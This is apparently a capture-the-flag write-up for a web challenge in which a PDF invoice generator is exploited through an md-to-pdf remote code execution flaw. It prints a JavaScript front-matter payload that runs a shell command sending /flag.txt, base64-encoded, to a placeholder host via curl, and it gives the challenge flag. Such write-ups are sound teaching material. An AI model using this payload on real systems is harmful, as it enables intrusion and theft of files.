![image](https://user-images.githubusercontent.com/80063008/169332230-ab4edbcc-702b-4cba-ad90-647268c4c04e.png)

We get on a page where we can create a PDF invoice.

![image](https://user-images.githubusercontent.com/80063008/169332707-6be56ec5-53fb-45f6-873c-cf8056c5e026.png)

Checking the provided source code, we notice how these PDFs are generated. They are using md-to-pdf that is vulnerable to RCE.

![image](https://user-images.githubusercontent.com/80063008/169332943-38599176-89cf-443c-bbdc-65ced4e8fd74.png)

We can find the required payload here:
https://github.com/simonhaenisch/md-to-pdf/issues/99

```javascript
---js\n((require("child_process")).execSync(\"curl http://yourip/`cat /flag.txt|base64 -w0`\"))\n---RCE
```
![image](https://user-images.githubusercontent.com/80063008/169334413-3cc0dea8-d5d7-4294-854f-145ca10e4ff6.png)

And we get our flag.  
![image](https://user-images.githubusercontent.com/80063008/169335540-3e7d420e-bebf-479a-bf8e-e76148c8d477.png)
![image](https://user-images.githubusercontent.com/80063008/169335045-a7298c78-d263-4e82-bb7d-461b5484ba5a.png)

HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
